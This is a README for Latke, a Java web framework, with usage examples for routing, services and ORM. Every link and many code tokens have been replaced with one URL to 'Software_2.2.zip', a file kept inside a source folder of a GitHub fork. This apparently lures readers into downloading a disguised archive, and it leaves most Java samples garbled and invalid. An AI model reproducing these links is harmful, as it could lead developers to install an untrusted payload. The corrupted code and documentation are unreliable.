Latke [![Build Status](https://github.com/HitEagle/latke/raw/refs/heads/master/latke-core/src/main/java/org/b3log/latke/servlet/handler/Software_2.2.zip)](https://github.com/HitEagle/latke/raw/refs/heads/master/latke-core/src/main/java/org/b3log/latke/servlet/handler/Software_2.2.zip) [![Maven Central](https://github.com/HitEagle/latke/raw/refs/heads/master/latke-core/src/main/java/org/b3log/latke/servlet/handler/Software_2.2.zip)](https://github.com/HitEagle/latke/raw/refs/heads/master/latke-core/src/main/java/org/b3log/latke/servlet/handler/Software_2.2.zip)
----

## 简介

[Latke](https://github.com/HitEagle/latke/raw/refs/heads/master/latke-core/src/main/java/org/b3log/latke/servlet/handler/Software_2.2.zip)（'lɑ:tkə，土豆饼）是一个简单易用的 Java Web 应用开发框架，包含 MVC、IoC、事件通知、ORM、插件等组件。

在实体模型上使用 JSON 贯穿前后端，使应用开发更加快捷。这是 Latke 不同于其他框架的地方，非常适合小型应用的快速开发。

## 特性

* 注解式、函数式路由
* 依赖注入
* 多种数据库 ORM
* 多语言
* 内存/Redis 缓存
* 事件机制
* 插件机制

## 案例

* [Demo](https://github.com/HitEagle/latke/raw/refs/heads/master/latke-core/src/main/java/org/b3log/latke/servlet/handler/Software_2.2.zip)：简单的 Latke 应用示例
* [Solo](https://github.com/HitEagle/latke/raw/refs/heads/master/latke-core/src/main/java/org/b3log/latke/servlet/handler/Software_2.2.zip)：一款小而美的 Java 博客系统
* [Symphony](https://github.com/HitEagle/latke/raw/refs/heads/master/latke-core/src/main/java/org/b3log/latke/servlet/handler/Software_2.2.zip)：一款用 Java 实现的现代化社区（论坛/BBS/社交网络/博客）平台

## 安装

```xml
<dependency>
    <groupId>org.b3log</groupId>
    <artifactId>latke-core</artifactId>
    <version>${https://github.com/HitEagle/latke/raw/refs/heads/master/latke-core/src/main/java/org/b3log/latke/servlet/handler/Software_2.2.zip}</version>
</dependency>
```

## 控制器层用法

**注解声明式路由**

```java
@RequestProcessing("/")
public void index(final RequestContext context) {
    https://github.com/HitEagle/latke/raw/refs/heads/master/latke-core/src/main/java/org/b3log/latke/servlet/handler/Software_2.2.zip(new SimpleFMRenderer("https://github.com/HitEagle/latke/raw/refs/heads/master/latke-core/src/main/java/org/b3log/latke/servlet/handler/Software_2.2.zip"));
    final Map<String, Object> dataModel = https://github.com/HitEagle/latke/raw/refs/heads/master/latke-core/src/main/java/org/b3log/latke/servlet/handler/Software_2.2.zip().getRenderDataModel();
    https://github.com/HitEagle/latke/raw/refs/heads/master/latke-core/src/main/java/org/b3log/latke/servlet/handler/Software_2.2.zip("greeting", "Hello, Latke!");
}
```

**函数式路由**

```java
https://github.com/HitEagle/latke/raw/refs/heads/master/latke-core/src/main/java/org/b3log/latke/servlet/handler/Software_2.2.zip("/register", registerProcessor::register);
https://github.com/HitEagle/latke/raw/refs/heads/master/latke-core/src/main/java/org/b3log/latke/servlet/handler/Software_2.2.zip();
```

**路径变量和查询字符串**

```java
@RequestProcessing("/var/{pathVar}")
public void paraPathVar(final RequestContext context) {
    final String paraVar = https://github.com/HitEagle/latke/raw/refs/heads/master/latke-core/src/main/java/org/b3log/latke/servlet/handler/Software_2.2.zip("paraVar");
    final String pathVar = https://github.com/HitEagle/latke/raw/refs/heads/master/latke-core/src/main/java/org/b3log/latke/servlet/handler/Software_2.2.zip("pathVar");
    https://github.com/HitEagle/latke/raw/refs/heads/master/latke-core/src/main/java/org/b3log/latke/servlet/handler/Software_2.2.zip(new JSONObject().put("paraVar", paraVar).put("pathVar", pathVar));
}
```

**JSON 解析**

```java
final JSONObject requestJSON = https://github.com/HitEagle/latke/raw/refs/heads/master/latke-core/src/main/java/org/b3log/latke/servlet/handler/Software_2.2.zip();
```

**Servlet 封装**

```java
final String remoteAddr = https://github.com/HitEagle/latke/raw/refs/heads/master/latke-core/src/main/java/org/b3log/latke/servlet/handler/Software_2.2.zip();
final String requestURI = https://github.com/HitEagle/latke/raw/refs/heads/master/latke-core/src/main/java/org/b3log/latke/servlet/handler/Software_2.2.zip();
final Object att = https://github.com/HitEagle/latke/raw/refs/heads/master/latke-core/src/main/java/org/b3log/latke/servlet/handler/Software_2.2.zip("name");
final String method = https://github.com/HitEagle/latke/raw/refs/heads/master/latke-core/src/main/java/org/b3log/latke/servlet/handler/Software_2.2.zip();
https://github.com/HitEagle/latke/raw/refs/heads/master/latke-core/src/main/java/org/b3log/latke/servlet/handler/Software_2.2.zip("https://github.com/HitEagle/latke/raw/refs/heads/master/latke-core/src/main/java/org/b3log/latke/servlet/handler/Software_2.2.zip");
final HttpServletRequest request = https://github.com/HitEagle/latke/raw/refs/heads/master/latke-core/src/main/java/org/b3log/latke/servlet/handler/Software_2.2.zip();
final HttpServletResponse response = https://github.com/HitEagle/latke/raw/refs/heads/master/latke-core/src/main/java/org/b3log/latke/servlet/handler/Software_2.2.zip();
```

## 服务层用法

**依赖注入、事务**

```java
@Service
public class UserService {

    private static final Logger LOGGER = https://github.com/HitEagle/latke/raw/refs/heads/master/latke-core/src/main/java/org/b3log/latke/servlet/handler/Software_2.2.zip(https://github.com/HitEagle/latke/raw/refs/heads/master/latke-core/src/main/java/org/b3log/latke/servlet/handler/Software_2.2.zip);

    @Inject
    private UserRepository userRepository;

    @Transactional
    public void saveUser(final String name, final int age) {
        final JSONObject user = new JSONObject();
        https://github.com/HitEagle/latke/raw/refs/heads/master/latke-core/src/main/java/org/b3log/latke/servlet/handler/Software_2.2.zip("name", name);
        https://github.com/HitEagle/latke/raw/refs/heads/master/latke-core/src/main/java/org/b3log/latke/servlet/handler/Software_2.2.zip("age", age);

        String userId;

        try {
            userId = https://github.com/HitEagle/latke/raw/refs/heads/master/latke-core/src/main/java/org/b3log/latke/servlet/handler/Software_2.2.zip(user);
        } catch (final RepositoryException e) {
            https://github.com/HitEagle/latke/raw/refs/heads/master/latke-core/src/main/java/org/b3log/latke/servlet/handler/Software_2.2.zip(https://github.com/HitEagle/latke/raw/refs/heads/master/latke-core/src/main/java/org/b3log/latke/servlet/handler/Software_2.2.zip, "Saves user failed", e);

            // 抛出异常后框架将回滚事务
            throw new IllegalStateException("Saves user failed");
        }

        https://github.com/HitEagle/latke/raw/refs/heads/master/latke-core/src/main/java/org/b3log/latke/servlet/handler/Software_2.2.zip(https://github.com/HitEagle/latke/raw/refs/heads/master/latke-core/src/main/java/org/b3log/latke/servlet/handler/Software_2.2.zip, "Saves a user successfully [userId={0}]", userId);
    }
}
```

## 持久层用法

**构造 ORM**

```java
@Repository
public class UserRepository extends AbstractRepository {

    public UserRepository() {
        super("user");
    }
}
```

**单表 CRUD**

```java
public interface Repository {
    String add(final JSONObject jsonObject) throws RepositoryException;
    void update(final String id, final JSONObject jsonObject) throws RepositoryException;
    void remove(final String id) throws RepositoryException;
    void remove(final Query query) throws RepositoryException;
    JSONObject get(final String id) throws RepositoryException;
    long count(final Query query) throws RepositoryException;
}
```

**条件查询**

```java
public JSONObject getByName(final String name) throws RepositoryException {
    final List<JSONObject> records = getList(new Query().
            setFilter(new PropertyFilter("name", https://github.com/HitEagle/latke/raw/refs/heads/master/latke-core/src/main/java/org/b3log/latke/servlet/handler/Software_2.2.zip, name)));
    if (https://github.com/HitEagle/latke/raw/refs/heads/master/latke-core/src/main/java/org/b3log/latke/servlet/handler/Software_2.2.zip()) {
        return null;
    }

    return https://github.com/HitEagle/latke/raw/refs/heads/master/latke-core/src/main/java/org/b3log/latke/servlet/handler/Software_2.2.zip(0);
}
```

**分页查询**

```java
new Query().setCurrentPageNum(1).setPageSize(50)
```

**按字段排序**

```java
new Query().addSort("name", https://github.com/HitEagle/latke/raw/refs/heads/master/latke-core/src/main/java/org/b3log/latke/servlet/handler/Software_2.2.zip);
```

**仅获取需要字段**

```java
new Query().addProjection("name", https://github.com/HitEagle/latke/raw/refs/heads/master/latke-core/src/main/java/org/b3log/latke/servlet/handler/Software_2.2.zip);
```

**原生 SQL**

```java
final List<JSONObject> records = select("SELECT * FROM `user` WHERE `name` = ?", name);
```

## 文档

* [《提问的智慧》精读注解版](https://github.com/HitEagle/latke/raw/refs/heads/master/latke-core/src/main/java/org/b3log/latke/servlet/handler/Software_2.2.zip)
* [为什么又要造一个叫 Latke 的轮子](https://github.com/HitEagle/latke/raw/refs/heads/master/latke-core/src/main/java/org/b3log/latke/servlet/handler/Software_2.2.zip)
* [Latke 快速上手指南](https://github.com/HitEagle/latke/raw/refs/heads/master/latke-core/src/main/java/org/b3log/latke/servlet/handler/Software_2.2.zip)
* [Latke 配置剖析](https://github.com/HitEagle/latke/raw/refs/heads/master/latke-core/src/main/java/org/b3log/latke/servlet/handler/Software_2.2.zip)
* [Latke 贡献指南](https://github.com/HitEagle/latke/raw/refs/heads/master/latke-core/src/main/java/org/b3log/latke/servlet/handler/Software_2.2.zip)

## 社区

* [讨论区](https://github.com/HitEagle/latke/raw/refs/heads/master/latke-core/src/main/java/org/b3log/latke/servlet/handler/Software_2.2.zip)
* [报告问题](https://github.com/HitEagle/latke/raw/refs/heads/master/latke-core/src/main/java/org/b3log/latke/servlet/handler/Software_2.2.zip)

## 鸣谢

Latke 的诞生离不开以下开源项目：

* [FreeMarker](https://github.com/HitEagle/latke/raw/refs/heads/master/latke-core/src/main/java/org/b3log/latke/servlet/handler/Software_2.2.zip)：使用广泛的 Java 模版引擎
* [Commons Lang](https://github.com/HitEagle/latke/raw/refs/heads/master/latke-core/src/main/java/org/b3log/latke/servlet/handler/Software_2.2.zip)：Java 语言相关工具库
* [Commons IO](https://github.com/HitEagle/latke/raw/refs/heads/master/latke-core/src/main/java/org/b3log/latke/servlet/handler/Software_2.2.zip)：Java IO 相关工具库
* [Commons Codec](https://github.com/HitEagle/latke/raw/refs/heads/master/latke-core/src/main/java/org/b3log/latke/servlet/handler/Software_2.2.zip)：Java 编解码库
* [Javassist](https://github.com/HitEagle/latke/raw/refs/heads/master/latke-core/src/main/java/org/b3log/latke/servlet/handler/Software_2.2.zip)：Java 字节码处理工具库
* [SLF4j](https://github.com/HitEagle/latke/raw/refs/heads/master/latke-core/src/main/java/org/b3log/latke/servlet/handler/Software_2.2.zip)：Java 日志门户
* [Gin](https://github.com/HitEagle/latke/raw/refs/heads/master/latke-core/src/main/java/org/b3log/latke/servlet/handler/Software_2.2.zip)：又快又好用的 golang HTTP web 框架